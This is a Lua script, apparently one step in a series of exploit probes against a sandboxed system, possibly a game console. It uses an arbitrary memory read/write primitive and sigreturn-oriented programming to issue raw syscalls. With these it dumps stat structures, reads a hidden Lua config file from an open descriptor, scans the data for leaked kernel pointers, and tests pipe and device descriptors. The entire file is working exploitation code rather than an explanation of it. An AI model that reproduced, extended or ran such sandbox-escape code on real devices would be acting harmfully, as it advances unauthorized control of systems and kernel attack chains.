-- CRASH_CLASS: LOW
-- PROBE 143h: Read entire fd=18 (Lua config file discovered in 143g)
-- Also: raw stat dump to determine correct struct layout,
-- and characterize fd=20/21 (mode=01, possibly pipes)

print("=== PROBE 143h: FD18 READ + STAT LAYOUT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

--------------------------------------------------------------------
-- [A] Raw stat dump for fd=0 to determine struct layout
--------------------------------------------------------------------
print("--- [A] raw stat fd=0 ---")

local stat_buf = gpu + 0x1000
for off = 0, 0x1FF, 4 do wd(stat_buf + off, 0xAAAAAAAA) end

local rv_s = srop(189, uint64(0), ua(stat_buf))
local sh, sl = get_hi_lo(rv_s)
print("[A] fstat(0) ret=" .. sl)

if sl == 0 then
    -- Find the end of valid data (last non-sentinel dword)
    local last_valid = 0
    for off = 0, 0x1FF, 4 do
        local v = safe_rd(stat_buf + off) or 0xAAAAAAAA
        if v ~= 0xAAAAAAAA then last_valid = off end
    end
    print("[A] stat size ~" .. (last_valid + 4) .. " bytes")

    -- Dump all non-sentinel values
    for off = 0, last_valid, 4 do
        local v = safe_rd(stat_buf + off) or 0xAAAAAAAA
        if v ~= 0xAAAAAAAA or off <= 0x80 then
            print("[A] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
    end
end

--------------------------------------------------------------------
-- [B] Read fd=18 content (Lua config)
-- Use lseek(478) to seek to beginning first
--------------------------------------------------------------------
print("")
print("--- [B] fd=18 full read ---")

-- lseek(fd, offset, whence=SEEK_SET=0)
local rv_ls = srop(478, uint64(18), uint64(0), uint64(0))
local lsh, lsl = get_hi_lo(rv_ls)
print("[B] lseek(18,0,SET) ret=" .. lsl .. " hi=" .. lsh)

local rbuf = gpu + 0x2000
local total_read = 0
local file_text = ""

for chunk = 0, 15 do
    for off = 0, 0xFFF, 4 do wd(rbuf + off, 0) end
    local rv_r = srop(3, uint64(18), ua(rbuf), uint64(4096))
    local rrh, rrl = get_hi_lo(rv_r)

    if rrl == 0 or rrl > 4096 then break end

    total_read = total_read + rrl
    -- Convert to text
    for ci = 0, math.min(rrl - 1, 4095) do
        local word_off = ci - (ci % 4)
        local w = safe_rd(rbuf + word_off)
        if w then
            local shift = (ci % 4) * 8
            local ch = math.floor(w / (2^shift)) % 256
            if ch >= 32 and ch < 127 then
                file_text = file_text .. string.char(ch)
            elseif ch == 10 then
                file_text = file_text .. "\n"
            elseif ch == 9 then
                file_text = file_text .. "\t"
            elseif ch == 0 then
                break
            else
                file_text = file_text .. "."
            end
        end
    end

    if rrl < 4096 then break end
end

print("[B] total read: " .. total_read .. " bytes")
print("[B] --- content start ---")
-- Print in chunks to avoid line length issues
local pos = 1
while pos <= #file_text and pos <= 8000 do
    local nl = file_text:find("\n", pos) or math.min(pos + 200, #file_text + 1)
    print(file_text:sub(pos, nl - 1))
    pos = nl + 1
end
print("[B] --- content end ---")

-- Scan for interesting patterns in the raw bytes
print("")
print("[B] kernel pointer scan in file data:")
for off = 0, math.min(total_read - 1, 0xFFF), 8 do
    local q = safe_rq(rbuf + off)
    if q then
        local qh, ql = get_hi_lo(q)
        if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
            print("[B] *** KPTR at byte " .. off .. "=" .. hex(q) .. " ***")
        end
    end
end

--------------------------------------------------------------------
-- [C] Characterize fd=20/21 (same ino, mode=01)
--------------------------------------------------------------------
print("")
print("--- [C] fd 20/21 ---")

-- Raw stat for fd=20
for off = 0, 0x1FF, 4 do wd(stat_buf + off, 0xBBBBBBBB) end
rv_s = srop(189, uint64(20), ua(stat_buf))
sh, sl = get_hi_lo(rv_s)
print("[C] fstat(20) ret=" .. sl)
if sl == 0 then
    for off = 0, 0x80, 4 do
        local v = safe_rd(stat_buf + off) or 0xBBBBBBBB
        if v ~= 0xBBBBBBBB then
            print("[C] fd20 +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
    end
end

-- Try reading fd=20
for off = 0, 0x3F, 4 do wd(rbuf + off, 0) end
rv_r = srop(3, uint64(20), ua(rbuf), uint64(64))
local r20h, r20l = get_hi_lo(rv_r)
print("[C] read(20) ret=" .. r20l .. " hi=" .. r20h)

-- Try writing to fd=20
local wbuf = gpu + 0x5000
wd(wbuf, 0x41414141)
local rv_w = srop(4, uint64(20), ua(wbuf), uint64(4))
local w20h, w20l = get_hi_lo(rv_w)
print("[C] write(20) ret=" .. w20l)

-- Can we read from fd=21 what we wrote to fd=20?
if w20l == 4 then
    for off = 0, 0x3F, 4 do wd(rbuf + off, 0) end
    rv_r = srop(3, uint64(21), ua(rbuf), uint64(64))
    local r21h, r21l = get_hi_lo(rv_r)
    print("[C] read(21) after write(20) ret=" .. r21l)
    if r21l > 0 and r21l < 64 then
        local v = safe_rd(rbuf) or 0
        print("[C] fd21 data=0x" .. string.format("%08X", v))
    end
end

--------------------------------------------------------------------
-- [D] Characterize device FDs (ino=4096): 11,12,13,16,17
--------------------------------------------------------------------
print("")
print("--- [D] device FDs ---")

local dev_fds = {11, 12, 13, 16, 17}
for _, fd in ipairs(dev_fds) do
    for off = 0, 0x1FF, 4 do wd(stat_buf + off, 0xCCCCCCCC) end
    rv_s = srop(189, uint64(fd), ua(stat_buf))
    sh, sl = get_hi_lo(rv_s)
    if sl == 0 then
        -- Dump first few fields to identify device
        local d00 = safe_rd(stat_buf + 0x00) or 0
        local d04 = safe_rd(stat_buf + 0x04) or 0
        local d08 = safe_rd(stat_buf + 0x08) or 0
        local d14 = safe_rd(stat_buf + 0x14) or 0
        print("[D] fd=" .. fd .. " [00]=0x" .. string.format("%08X", d00) ..
              " [04]=0x" .. string.format("%08X", d04) ..
              " [08]=0x" .. string.format("%08X", d08) ..
              " [14]=0x" .. string.format("%08X", d14))
    end
end

print("")
print("=== DONE ===")
